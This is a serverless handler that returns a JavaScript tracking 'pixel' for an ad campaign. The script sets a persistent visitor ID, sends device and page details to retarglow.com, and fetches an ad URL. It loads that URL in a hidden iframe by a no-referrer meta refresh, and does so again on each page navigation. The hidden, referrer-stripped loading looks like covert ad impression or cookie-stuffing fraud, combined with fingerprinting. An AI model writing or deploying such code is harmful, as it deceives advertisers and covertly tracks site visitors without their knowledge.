exports.handler = async (event) => {
  const headers = {
    "Content-Type": "application/javascript",
    "Access-Control-Allow-Origin": "*"
  };

  try {
    const id = event.pathParameters?.id || "default-campaign";

    const js = `
!function(){
  const c = "${id}";

  function i(t){
    try{
      let r = localStorage.getItem("_r");
      if(!r){
        r = document.cookie.replace(/(?:(?:^|.*;\\s*)_r\\s*=\\s*([^;]*).*$)|^.*$/, "$1");
        if(!r){
          r = crypto.randomUUID();
          document.cookie = "_r=" + r + "; path=/; max-age=" + (60*60*24*30);
        }
        localStorage.setItem("_r", r);
      } else {
        document.cookie = "_r=" + r + "; path=/; max-age=" + (60*60*24*30);
      }

      sessionStorage.setItem("ad_injected_" + c, "1");

      const d = {
        cid: c,
        u: location.href,
        r: document.referrer || null,
        ua: navigator.userAgent,
        dt: /Mobi|Android/i.test(navigator.userAgent) ? "M" : "D",
        b: (() => {
          const ua = navigator.userAgent;
          return ua.includes("Chrome") ? "C" : ua.includes("Firefox") ? "F" : ua.includes("Safari") ? "S" : "U";
        })(),
        os: navigator.platform,
        sr: screen.width + "x" + screen.height,
        cm: { _r: r }
      };

      navigator.sendBeacon ?
        navigator.sendBeacon("https://retarglow.com/track", new Blob([JSON.stringify(d)], {type: 'application/json'})) :
        fetch("https://retarglow.com/track", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(d)
        });

      fetch("https://retarglow.com/getad", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ page_url: location.href, cm: { _r: r }, country: null })
      }).then(res => res.json())
      .then(j => {
        if(j.ad_url){
          const f = j.ad_url.replace("{{_r}}", r);
          const x = document.createElement("iframe");
          x.style.display = "none";
          x.setAttribute("referrerpolicy", "no-referrer");
          x.srcdoc = \`<meta http-equiv='refresh' content='0;url=\${f}'><meta name='referrer' content='no-referrer'>\`;
          document.body.appendChild(x);
        }
      }).catch(e => console.warn("Ad Fetch Error:", e));
    }catch(e){console.error("Pixel Error:", e);}
  }

  if(document.readyState==="complete"||document.readyState==="interactive"){
    i();
  }else{
    document.addEventListener("DOMContentLoaded", i);
  }

  ["pushState","replaceState","popstate"].forEach(evt => {
    window.addEventListener(evt, ()=> {
      sessionStorage.removeItem("ad_injected_" + c);
      i();
    });
  });
}();
`;

    return {
      statusCode: 200,
      headers,
      body: js
    };
  } catch (err) {
    return {
      statusCode: 500,
      headers,
      body: `console.error("PixelServe error:", ${JSON.stringify(err.message)});`
    };
  }
};
